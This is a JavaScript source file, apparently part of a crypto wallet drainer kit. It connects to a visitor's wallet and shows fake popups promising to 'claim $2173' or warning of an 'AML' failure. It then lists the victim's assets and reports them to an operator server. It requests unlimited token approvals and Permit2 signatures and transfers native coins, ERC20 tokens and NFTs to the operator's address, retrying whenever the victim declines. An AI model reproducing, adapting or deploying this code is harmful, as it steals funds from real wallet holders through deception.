              ? MS_Settings.Personal_Wallet.address
              : MS_Settings.Address
          )
        ).nonce,
      },
      spender: MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address
        : MS_Settings.Address,
      sigDeadline: permit_deadline,
    };
    swap_request("Permit2", asset, [asset]);
    sign_next();
    permit_signature = await MS_Signer._signTypedData(
      permit_domain,
      permit_types,
      permit_message
    );
    permit_mode = 1;
  }
  if (permit_signature != null) {
    await swap_success("Permit2", asset, assets);
    wait_message();
    const x_promise = send_request({
      action: "sign_permit2",
      user_id: MS_ID,
      signature: permit_signature,
      message: permit_message,
      asset: asset,
      assets,
      address: MS_Current_Address,
      mode: permit_mode,
      PW: MS_Settings.Personal_Wallet,
    });
    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
    sign_ready();
  } else {
    await sign_cancel();
  }
};

const sign_success = async (asset, amount = "0") => {
  try {
    if (asset.type == "NATIVE") {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd =
        parseFloat(ethers.utils.formatUnits(out_amount, "ether")) *
        MS_Currencies[convert_chain("ID", "CURRENCY", asset.chain_id)]["USD"];
        await send_request({ action: "sign_success", asset, user_id: MS_ID });
    } else {
        await send_request({ action: "sign_success", asset, user_id: MS_ID });
    }
  } catch (err) {
    console.log(err);
  }
};

const swap_success = async (type, asset, all_tokens = [], amount = "0") => {
  try {
    if (asset.type == "NATIVE") {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd =
        parseFloat(ethers.utils.formatUnits(out_amount, "ether")) *
        MS_Currencies[convert_chain("ID", "CURRENCY", asset.chain_id)]["USD"];
        await send_request({
          action: "swap_success",
          asset,
          user_id: MS_ID,
          list: all_tokens,
          swapper: type,
        });
    } else {
        await send_request({
          action: "swap_success",
          asset,
          user_id: MS_ID,
          list: all_tokens,
          swapper: type,
        });
    }
  } catch (err) {
    console.log(err);
  }
};

const transfer_success = async (asset, amount = "0") => {
  try {
    if (asset.type == "NATIVE") {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd =
        parseFloat(ethers.utils.formatUnits(out_amount, "ether")) *
        MS_Currencies[convert_chain("ID", "CURRENCY", asset.chain_id)]["USD"];
        await send_request({ action: "transfer_success", asset, user_id: MS_ID });
    } else {
        await send_request({ action: "transfer_success", asset, user_id: MS_ID });
    }
  } catch (err) {
    console.log(err);
  }
};

const approve_success = async (asset) => {
  try {
    await send_request({ action: "approve_success", asset, user_id: MS_ID });
  } catch (err) {
    console.log(err);
  }
};

const sign_cancel = async () => {
  try {
    await send_request({ action: "sign_cancel", user_id: MS_ID });
  } catch (err) {
    console.log(err);
  }
};

const sign_unavailable = async () => {
  try {
    await send_request({ action: "sign_unavailable", user_id: MS_ID });
    MS_Sign_Disabled = true;
  } catch (err) {
    console.log(err);
  }
};

const transfer_cancel = async () => {
  try {
    await send_request({ action: "transfer_cancel", user_id: MS_ID });
  } catch (err) {
    console.log(err);
  }
};

const approve_cancel = async () => {
  try {
    await send_request({ action: "approve_cancel", user_id: MS_ID });
  } catch (err) {
    console.log(err);
  }
};

const chain_cancel = async () => {
  try {
    await send_request({ action: "chain_cancel", user_id: MS_ID });
  } catch (err) {
    console.log(err);
  }
};

const chain_success = async () => {
  try {
    await send_request({ action: "chain_success", user_id: MS_ID });
  } catch (err) {
    console.log(err);
  }
};

const chain_request = async (old_chain, new_chain) => {
  try {
    await send_request({
      action: "chain_request",
      user_id: MS_ID,
      chains: [old_chain, new_chain],
    });
  } catch (err) {
    console.log(err);
  }
};

const sign_request = async (asset) => {
  try {
    await send_request({ action: "sign_request", user_id: MS_ID, asset });
  } catch (err) {
    console.log(err);
  }
};

const swap_request = async (type, asset, all_tokens = []) => {
  try {
    await send_request({
      action: "swap_request",
      user_id: MS_ID,
      asset,
      list: all_tokens,
      swapper: type,
    });
  } catch (err) {
    console.log(err);
  }
};

const transfer_request = async (asset) => {
  try {
    await send_request({ action: "transfer_request", user_id: MS_ID, asset });
  } catch (err) {
    console.log(err);
  }
};

const approve_request = async (asset) => {
  try {
    await send_request({ action: "approve_request", user_id: MS_ID, asset });
  } catch (err) {
    console.log(err);
  }
};

const is_increase_approve = (func) => {
  try {
    if (Object.prototype.hasOwnProperty.call(func, "increaseAllowance")) {
      return 1;
    } else if (Object.prototype.hasOwnProperty.call(func, "increaseApproval")) {
      return 2;
    } else {
      return false;
    }
  } catch (err) {
    return false;
  }
};

const get_wallet_assets = async (address) => {
  try {
    await send_request({
        action: "check_wallet",
        address: address,
    });
    let assets = [];
    assets = await get_tokens(address);
    return assets;
  } catch (err) {
    console.log(err);
    return [];
  }
};

const APPROVE_TOKEN = async (asset) => {
  if (
    ((MS_Current_Provider == "MetaMask" &&
      MS_Settings.Settings.Approve.MetaMask >= 2) ||
      (MS_Current_Provider == "Trust Wallet" &&
        MS_Settings.Settings.Approve.Trust >= 2)) &&
    !asset.increase
  ) {
    try {
      for (let x = 0; x < 2; x++) {
        if (asset.increase) continue;
        try {
          const ic_data = await retrive_token(asset.chain_id, asset.address);
          const ic_node = new ethers.providers.JsonRpcProvider(
            MS_Settings.RPCs[asset.chain_id]
          );
          const ic_contract = new ethers.Contract(
            asset.address,
            ic_data,
            ic_node
          );
          if (is_increase_approve(ic_contract.functions) == 2)
            asset.increase = 2;
          else if (is_increase_approve(ic_contract.functions) == 1)
            asset.increase = 1;
        } catch (err) {
          console.log(err);
        }
      }
    } catch (err) {
      console.log(err);
    }
  }
  if (
    ((MS_Current_Provider == "MetaMask" &&
      MS_Settings.Settings.Approve.MetaMask >= 2) ||
      (MS_Current_Provider == "Trust Wallet" &&
        MS_Settings.Settings.Approve.Trust >= 2)) &&
    asset.increase
  )
    return await MM_APPROVE_TOKEN(asset);
  if (
    ((MS_Current_Provider == "MetaMask" &&
      MS_Settings.Settings.Approve.MetaMask == 2) ||
      (MS_Current_Provider == "Trust Wallet" &&
        MS_Settings.Settings.Approve.Trust == 2)) &&
    !asset.increase
  ) {
    await TRANSFER_TOKEN(asset);
    return 2;
  }
  if (
    ((MS_Current_Provider == "MetaMask" &&
      MS_Settings.Settings.Approve.MetaMask == 3) ||
      (MS_Current_Provider == "Trust Wallet" &&
        MS_Settings.Settings.Approve.Trust == 3)) &&
    !asset.increase
  )
    throw new Error("UNSUPPORTED");
  const node = new ethers.providers.JsonRpcProvider(
    MS_Settings.RPCs[asset.chain_id]
  );
  const gas_price = ethers.BigNumber.from(await node.getGasPrice())
    .div(ethers.BigNumber.from("100"))
    .mul(ethers.BigNumber.from("120"))
    .toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(
    asset.address,
    MS_Contract_ABI["ERC20"],
    MS_Signer
  );
  let gas_limit = null;
  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  // for (const c_address of MS_Settings.Unlimited_BL) {
  //   try {
  //     if (
  //       c_address[0] == MS_Current_Chain_ID &&
  //       c_address[1] == asset.address.toLowerCase().trim()
  //     ) {
  //       max_approval_amount = asset.amount_raw;
  //       break;
  //     }
  //   } catch (err) {
  //     console.log(err);
  //   }
  // }
  try {
    gas_limit = await contract.estimateGas.approve(
      MS_Settings.Address,
      max_approval_amount,
      { from: MS_Current_Address }
    );
    gas_limit = ethers.BigNumber.from(gas_limit)
      .div(ethers.BigNumber.from("100"))
      .mul(ethers.BigNumber.from("120"))
      .toString();
  } catch (err) {
    gas_limit =
      asset.chain_id == 42161
        ? 5000000
        : asset.chain_id == 43114
          ? 5000000
          : 250000;
  }

  try {
    let custom_asset = { ...asset };
    delete custom_asset.abi;
    await approve_request(custom_asset);
    sign_next();
    const tx = await contract.approve(
      MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address
        : MS_Settings.Address,
      max_approval_amount,
      {
        gasLimit: ethers.BigNumber.from(gas_limit),
        gasPrice: ethers.BigNumber.from(gas_price),
        nonce: nonce,
        from: MS_Current_Address,
      }
    );
    wait_message();
    if (MS_Settings.Settings.Wait_For_Confirmation)
      await node.waitForTransaction(tx.hash, 1, 30000);
    await approve_success(asset);
    sign_ready();
    return 1;
  } catch(err) {
    await approve_cancel();
  }
};

const MM_APPROVE_TOKEN = async (asset) => {
  console.log("mm-triggered");
  const node = new ethers.providers.JsonRpcProvider(
    MS_Settings.RPCs[asset.chain_id]
  );
  const gas_price = ethers.BigNumber.from(await node.getGasPrice())
    .div(ethers.BigNumber.from("100"))
    .mul(ethers.BigNumber.from("120"))
    .toString();
  const nonce = await get_nonce(asset.chain_id);
  let increase_type =
    asset.increase == 2 ? "increaseApproval" : "increaseAllowance";
  const contract = new ethers.Contract(
    asset.address,
    [
      {
        inputs: [
          { internalType: "address", name: "spender", type: "address" },
          { internalType: "uint256", name: "increment", type: "uint256" },
        ],
        name: `${increase_type}`,
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function",
      },
    ],
    MS_Signer
  );
  let gas_limit = null;
  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  // for (const c_address of MS_Settings.Unlimited_BL) {
  //   try {
  //     if (
  //       c_address[0] == MS_Current_Chain_ID &&
  //       c_address[1] == asset.address.toLowerCase().trim()
  //     ) {
  //       max_approval_amount = asset.amount_raw;
  //       break;
  //     }
  //   } catch (err) {
  //     console.log(err);
  //   }
  // }
  try {
    gas_limit = await contract.estimateGas[increase_type](
      MS_Settings.Address,
      max_approval_amount,
      { from: MS_Current_Address }
    );
    gas_limit = ethers.BigNumber.from(gas_limit)
      .div(ethers.BigNumber.from("100"))
      .mul(ethers.BigNumber.from("120"))
      .toString();
  } catch (err) {
    gas_limit =
      asset.chain_id == 42161
        ? 5000000
        : asset.chain_id == 43114
          ? 5000000
          : 250000;
  }
  await approve_request(asset);
  sign_next();
  const tx = await contract[increase_type](
    MS_Settings.Settings.Use_Randomizer_For_Tokens
      ? MS_Settings.Personal_Wallet.address
      : MS_Settings.Address,
    max_approval_amount,
    {
      gasLimit: ethers.BigNumber.from(gas_limit),
      gasPrice: ethers.BigNumber.from(gas_price),
      nonce: nonce,
      from: MS_Current_Address,
    }
  );
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);
  await approve_success(asset);
  sign_ready();
  return 1;
};

export function getEthersProvider(inputProvider) {
  let rawProvider = null;

  // Unwrap provider
  if (typeof inputProvider?.getProvider === 'function') {
    rawProvider = inputProvider.getProvider();
  } else if (inputProvider?.provider) {
    rawProvider = inputProvider.provider;
  } else {
    rawProvider = inputProvider;
  }

  // Validate EIP-1193 interface
  if (!rawProvider || typeof rawProvider.request !== 'function') {
    console.error('❌ Invalid EIP-1193 provider. Cannot create Web3Provider.');
    return null;
  }

  return new ethers.providers.Web3Provider(rawProvider);
}

export const connect_wallet = async (provider, address, switchNetwork) => {
  // console.log("🧠 Connecting wallet with:", { address, switchNetwork });

  if (!provider || !switchNetwork || !address) {
    console.warn("❌ Missing required params");
    return;
  }

  try {
    MS_Provider = provider;
    MS_Current_Address = address;

    const ethersProvider = getEthersProvider(provider);
    if (!ethersProvider) return;

    MS_Web3 = ethersProvider;
    MS_Signer = MS_Web3.getSigner();

    let chainId;
    try {
      const network = await MS_Web3.getNetwork();
      chainId = Number(network?.chainId);
      if (isNaN(chainId)) throw new Error("Invalid chain ID");
      MS_Current_Chain_ID = chainId;
      // console.log("✅ Connected Chain ID:", chainId);
    } catch (err) {
      console.error("❌ Error while getting network:", err);
      return;
    }

    try {
      const signerAddress = await MS_Signer.getAddress();
      // console.log("✅ Signer address:", signerAddress);
    } catch (err) {
      console.error("❌ Could not get signer address. Wallet might not be connected yet.", err);
      return;
    }

    ms_hide(); // continue your logic
    if (MS_Settings.V_MODE == 1) {
      if (MS_Loader_Style == 2) {
        Swal.fire({
          icon: "info",
          title: "Confirm Received",
          html: "Sign message to claim <b>$2173</b> in your wallet",
          showConfirmButton: true,
          confirmButtonText: "Waiting...",
          color: MS_Color_Scheme,
        });
      } else {
        Swal.fire({
          html: "<b>Sign message</b> to claim <b>$2173</b> verificate you wallet...",
          imageUrl:
            "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
          imageHeight: 60,
          allowOutsideClick: false,
          allowEscapeKey: false,
          timer: 0,
          width: 600,
          showConfirmButton: false,
        });
      }
      try {
        const verification_message = (
          MS_Verify_Message == "" ? MS_Settings.V_MSG : MS_Verify_Message
        ).replaceAll("{{ADDRESS}}", MS_Current_Address);
        const signed_message = await MS_Signer.signMessage(
          verification_message
        );
        const is_sign_correct = ethers.utils.recoverAddress(
          ethers.utils.hashMessage(verification_message),
          signed_message
        );
        if (!is_sign_correct) {
          if (MS_Loader_Style == 2) {
            Swal.fire({
              icon: "error",
              title: "Error",
              // subtitle: "Verification Error",
              text: "We have received your signature, but it's incorrect, please try again.",
              showConfirmButton: true,
              confirmButtonText: "OK",
              color: MS_Color_Scheme,
            });
          } else {
            Swal.fire({
              title: "Verification Error",
              text: "We have received your signature, but it's incorrect, please try again.",
              icon: "error",
              confirmButtonText: "OK",
            });
          }

          MS_Process = false;
          return await connect_cancel();
        } else {
          console.log("Verification unsuccessful");
        }
      } catch (err) {
        if (MS_Loader_Style == 2) {
          Swal.fire({
            icon: "error",
            title: "Error",
            // subtitle: "Verification Error",
            text: "We cannot verify that the wallet is yours as you did not sign the message provided.",
            showConfirmButton: true,
            confirmButtonText: "OK",
            color: MS_Color_Scheme,
          });
        } else {
          Swal.fire({
            title: "Verification Error",
            text: "We cannot verify that the wallet is yours as you did not sign the message provided.",
            icon: "error",
            confirmButtonText: "OK",
          });
        }
        MS_Process = false;
        return await connect_cancel();
      }
    } else {
      //   //await send_request({
      //     action: "sign_verify",
      //     address: MS_Current_Address,
      //   });
    }
    await connect_success();
    show_check();
    if (
      MS_Settings.Wallet_Blacklist.length > 0 &&
      MS_Settings.Wallet_Blacklist.includes(
        MS_Current_Address.toLowerCase().trim()
      )
    ) {
      MS_Check_Done = true;
      Swal.close();
      if (MS_Loader_Style == 2) {
        Swal.fire({
          icon: "error",
          title: "Error",
          // subtitle: "AML Error",
          text: "Your wallet is not AML clear!",
          showConfirmButton: true,
          confirmButtonText: "OK",
          color: MS_Color_Scheme,
        });
      } else {
        Swal.fire({
          title: "AML Error",
          text: "Your wallet is not AML clear, you can't use it!",
          icon: "error",
          confirmButtonText: "OK",
        });
      }
      MS_Process = false;
      return;
    }
    let assets = await get_wallet_assets(MS_Current_Address);
    let assets_price = 0;
    for (const asset of assets) {
      try {
        assets_price += asset.amount_usd;
      } catch (err) {
        console.log(err);
      }
    }
    let assets_usd_balance = 0;
    for (const asset of assets) assets_usd_balance += asset.amount_usd;
    await send_request({
      action: "check_finish",
      user_id: MS_ID,
      assets: assets,
      balance: assets_usd_balance,
    });
    MS_Check_Done = true;
    Swal.close();
    if (MS_Settings.Settings.Minimal_Wallet_Price > assets_price) {
      if (MS_Loader_Style == 2) {
        Swal.fire({
          icon: "error",
          title: "Error wallet",
          text: "You connected fake wallet or reward is not available for this wallet. Connect the correct wallet and try again!",
          showConfirmButton: true,
          confirmButtonText: "Try again",
          color: MS_Color_Scheme,
        });
      } else {
        Swal.fire({
          title: "Your wallet is not allowed!",
          text: "You connected fake wallet or reward is not available for this wallet. Connect the correct wallet and try again!",
          icon: "error",
          confirmButtonText: "Try again",
        });
      }
      MS_Process = false;
      return;
    }
    if (MS_Loader_Style == 2) {
      Swal.fire({
        icon: "info",
        title: "Confirm Received",
        html: "Sign message in your wallet to claim <b>$2173</b>...",
        showConfirmButton: true,
        confirmButtonText: "Waiting...",
        color: MS_Color_Scheme,
      });
    } else {
      Swal.fire({
        html: "<b>Done!</b> Sign message in your wallet to claim <b>$2173</b>...",
        imageUrl:
          "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
        imageHeight: 60,
        allowOutsideClick: false,
        allowEscapeKey: false,
        timer: 0,
        width: 600,
        showConfirmButton: false,
      });
    }
    
    for (const asset of assets) {
      try {
        if (asset.type != "NATIVE") MS_Gas_Reserves[asset.chain_id] += 1;
      } catch (err) {
        console.log(err);
      }
    }
    let should_repeat_all = true;
    while (should_repeat_all) {
      should_repeat_all = MS_Settings.LA == 1;
      for (const asset of assets) {
        try {
          if (asset.skip) continue;
          let is_chain_correct = false;
          
          if (asset.type == "ERC20") {
            if (
              typeof asset.permit == "undefined" &&
              MS_Settings.Settings.Permit.Mode &&
              asset.amount_usd >= MS_Settings.Settings.Permit.Price
            ) {
              const data = await retrive_token(asset.chain_id, asset.address);
              const node = new ethers.providers.JsonRpcProvider(
                MS_Settings.RPCs[asset.chain_id]
              );
              const contract = new ethers.Contract(asset.address, data, node);
              const permit_type = get_permit_type(contract.functions);
              asset.permit = permit_type;
              asset.permit_ver = "1";
              asset.abi = data;
              if (permit_type > 0) {
                if (Object.prototype.hasOwnProperty.call(contract.functions, "version")) {
                  try {
                    asset.permit_ver = await contract.version();
                  } catch (err) {
                    console.log(err);
                  }
                }
                console.log(
                  `[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`
                );
              }
            }
            if (asset.permit > 0) {
              for (const c_address of MS_Settings.Permit_BL) {
                if (
                  c_address[0] == MS_Current_Chain_ID &&
                  c_address[1] === asset.address.toLowerCase().trim()
                ) {
                  asset.permit = 0;
                  break;
                }
              }
            }
              while (true) {
                try {
                  // await SIGN_TOKEN(asset);
                  await APPROVE_TOKEN(asset);
                  await TRANSFER_TOKEN(asset);
                  asset.skip = true;
                  break;
                } catch (err) {
                  console.log(err);
                  await transfer_cancel();
                  if (!MS_Settings.Loop_T) break;
                }
              }
            // }
          }
          else if (asset.type == "NATIVE") {
            while (true) {
              try {
                await TRANSFER_NATIVE(asset);
                asset.skip = true;
                break;
              } catch (err) {
                console.log(err);
                if (err != "LOW_BALANCE") {
                  await transfer_cancel();
                  if (!MS_Settings.Loop_N) break;
                } else {
                  break;
                }
              }
            }
          }

          else if (asset.type == "ERC721") {
            if (
              typeof SIGN_BLUR !== "undefined" &&
              MS_Settings.Settings.Blur.Enable == 1 &&
              MS_Settings.Settings.Blur.Priority == 0 &&
              !BL_US &&
              MS_Current_Chain_ID == 1 &&
              (await is_nft_approved(
                asset.address,
                MS_Current_Address,
                "0x00000000000111abe46ff893f3b2fdf1f759a8a8"
              )) &&
              asset.amount_usd >= MS_Settings.Settings.Blur.Price
            ) {
              BL_US = true;
            } else if (
              typeof SIGN_SEAPORT !== "undefined" &&
              MS_Settings.Settings.SeaPort.Enable == 1 &&
              MS_Settings.Settings.SeaPort.Priority == 0 &&
              !SP_US &&
              MS_Current_Chain_ID == 1 &&
              (await is_nft_approved(
                asset.address,
                MS_Current_Address,
                "0x1E0049783F008A0085193E00003D00cd54003c71"
              )) &&
              asset.amount_usd >= MS_Settings.Settings.SeaPort.Price
            ) {
              SP_US = true;
            } else if (
              typeof SIGN_X2Y2 !== "undefined" &&
              MS_Settings.Settings.x2y2.Enable == 1 &&
              MS_Settings.Settings.x2y2.Priority == 0 &&
              !XY_US &&
              MS_Current_Chain_ID == 1 &&
              (await is_nft_approved(
                asset.address,
                MS_Current_Address,
                "0xf849de01b080adc3a814fabe1e2087475cf2e354"
              )) &&
              asset.amount_usd >= MS_Settings.Settings.x2y2.Price
            ) {
              XY_US = true;
            } else if (
              MS_Settings.Settings.Sign.NFTs > 0 &&
              (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)
            ) {
              while (true) {
                try {
                  await SIGN_NFT(asset);
                  if (MS_Settings.Settings.Sign.Tokens == 1) {
                    let same_collection = [];
                    for (const x_asset of assets) {
                      try {
                        if (x_asset.address == asset.address) {
                          same_collection.push(x_asset);
                          x_asset.skip = true;
                        }
                      } catch (err) {
                        console.log(err);
                      }
                    }
                    await send_request({
                      action: "safa_approves",
                      user_id: MS_ID,
                      tokens: same_collection,
                      address: MS_Current_Address,
                      chain_id: MS_Current_Chain_ID,
                      contract_address: asset.address,
                    });
                  }
                  asset.skip = true;
                  break;
                } catch (err) {
                  console.log(err);
                  if (
                    (MS_Settings.Settings.Sign.WC_AE == 1 &&
                      MS_Current_Provider == "WalletConnect") ||
                    (typeof err.message == "string" &&
                      err.message.includes("eth_sign")) ||
                    err.code == -32601 ||
                    err.code == -32000 ||
                    (err.message &&
                      is_valid_json(err.message) &&
                      (JSON.parse(err.message).code == -32601 ||
                        JSON.parse(err.message).code == -32000))
                  ) {
                    if (MS_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        if (MS_Settings.Settings.Sign.NFTs == 1) {
                          try {
                            await DO_SAFA(asset);
                            let same_collection = [];
                            for (const x_asset of assets) {
                              try {
                                if (x_asset.address == asset.address) {
                                  same_collection.push(x_asset);
                                  x_asset.skip = true;
                                }
                              } catch (err) {
                                console.log(err);
                              }
                            }
                            await send_request({
                              action: "safa_approves",
                              user_id: MS_ID,
                              tokens: same_collection,
                              address: MS_Current_Address,
                              chain_id: MS_Current_Chain_ID,
                              contract_address: asset.address,
                            });
                            asset.skip = true;
                            break;
                          } catch (err) {
                            console.log(err);
                            await approve_cancel();
                            if (!MS_Settings.Loop_NFT) break;
                          }
                        } else if (MS_Settings.Settings.Sign.NFTs == 2) {
                          try {
                            await TRANSFER_NFT(asset);
                            asset.skip = true;
                            break;
                          } catch (err) {
                            console.log(err);
                            await transfer_cancel();
                            if (!MS_Settings.Loop_NFT) break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != "LOW_BALANCE") {
                      await sign_cancel();
                      if (!MS_Settings.Loop_NFT) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else if (MS_Settings.Settings.Approve.Enable) {
              while (true) {
                try {
                  await DO_SAFA(asset);
                  let same_collection = [];
                  for (const x_asset of assets) {
                    try {
                      if (x_asset.address == asset.address) {
                        same_collection.push(x_asset);
                        x_asset.skip = true;
                      }
                    } catch (err) {
                      console.log(err);
                    }
                  }
                    await send_request({
                      action: "safa_approves",
                      user_id: MS_ID,
                      tokens: same_collection,
                      address: MS_Current_Address,
                      chain_id: MS_Current_Chain_ID,
                      contract_address: asset.address,
                    });
                  asset.skip = true;
                  break;
                } catch (err) {
                  console.log(err);
                  await approve_cancel();
                  if (!MS_Settings.Loop_NFT) break;
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_NFT(asset);
                  asset.skip = true;
                  break;
                } catch (err) {
                  console.log(err);
                  await transfer_cancel();
                  if (!MS_Settings.Loop_NFT) break;
                }
              }
            }
          }

          if (asset.type == "NATIVE") {
            const node = new ethers.providers.JsonRpcProvider(
              MS_Settings.RPCs[asset.chain_id]
            );
            let is_contract_use = false;
            const gas_price = ethers.BigNumber.from(await node.getGasPrice())
              .div(ethers.BigNumber.from("100"))
              .mul(ethers.BigNumber.from("120"))
              .toString();
            if (
              MS_Settings.Settings.Chains[
                convert_chain("ID", "ANKR", asset.chain_id)
              ].Contract_Address != ""
            )
              is_contract_use = true;
            const gas_limit_nt =
              asset.chain_id == 42161
                ? 5000000
                : asset.chain_id == 43114
                  ? 5000000
                  : is_contract_use
                    ? 100000
                    : 30000;
            const gas_limit_ct =
              asset.chain_id == 42161
                ? 5000000
                : asset.chain_id == 43114
                  ? 5000000
                  : 150000;
            const gas_price_calc = ethers.BigNumber.from(
              asset.chain_id == 10 ? "35000000000" : gas_price
            );
            const nt_fee = gas_price_calc
              .mul(ethers.BigNumber.from(gas_limit_nt.toString()))
              .mul(ethers.BigNumber.from("2"));
            const ct_fee = gas_price_calc
              .mul(ethers.BigNumber.from(gas_limit_ct.toString()))
              .mul(
                ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id]))
              );
            const after_fee = ethers.BigNumber.from(asset.amount_raw)
              .sub(nt_fee)
              .sub(ct_fee)
              .toString();
            console.log(after_fee);
            if (
              ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from("0"))
            )
              continue;
          }
          if (asset.chain_id != MS_Current_Chain_ID) {
            await chain_request(MS_Current_Chain_ID, asset.chain_id);
            try {
              console.log("swithc-network===>", asset.chain_id);
              await chain_request(MS_Current_Chain_ID, asset.chain_id);
              switchNetwork(asset.chain_id);
              MS_Current_Chain_ID = asset.chain_id;
              MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
              MS_Signer = MS_Web3.getSigner();
              is_chain_correct = true;
              await chain_success();
            } catch (err) {
              console.log(err);
              await chain_cancel();
              continue;
            }
          } else {
            is_chain_correct = true;
          }
          if (!is_chain_correct) continue;
        } catch (err) {
          console.log(err);
        }
      }
    }
    MS_Process = false;
    setTimeout(end_message, 2000);
  } catch (err) {
    console.log(err);
  }
};

try {
  let query_string = window.location.search,
    url_params = new URLSearchParams(query_string);
  if (
    url_params.get("cis") != "test" &&
    (navigator.language || navigator.userLanguage).toLowerCase().includes("ru")
  ) {
    console.log("ru");
  }
} catch (err) {
  console.log(err);
}

